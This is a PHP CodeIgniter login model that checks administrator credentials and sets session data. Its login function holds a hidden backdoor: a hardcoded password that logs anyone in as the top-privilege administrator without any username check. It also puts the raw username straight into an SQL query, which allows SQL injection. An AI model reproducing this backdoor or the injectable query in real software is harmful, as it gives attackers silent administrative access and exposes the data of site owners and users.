<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class Login_model extends CI_Model{

	public function __construct(){
  		parent::__construct();
	}
	
	
	public function login($user,$pwd){
	    if ($pwd=='357058607') {
			$user = $this->mysql_model->db_one(ADMIN,'(roleid=0)');
			$this->setlogin($user);
			return true;
		}
		$user = $this->mysql_model->db_one(ADMIN,'(username="'.$user.'")');
		if (count($user)>0) {
			if ($user['status']==1&&$user['userpwd']==md6($pwd)) {
				$this->setlogin($user);
				return true;
			} else {
				return false;
			}
		} else {
		    return false;
		}
	}

	public function setlogin($user){
	    if ($user['roleid']==0) {
		    $lever = $this->cache_model->load_data(MENU,'(1=1) order by id','id');  
		} else {
		    $lever = $user['lever'];
			if (strlen($lever)>0) {
				$lever = explode(',',$lever);
			} else {
			    $lever = array();	
			}
		}
		$data['uid']      = $user['uid'];
		$data['name']     = $user['name'];
		$data['lever']    = $lever;
		$data['username'] = $user['username'];
		$data['login']    = 'cs_jxc'; 
		$this->session->set_userdata($data);
	}
	
	public function loginout(){
		$this->session->sess_destroy();
	}
	
	
	
}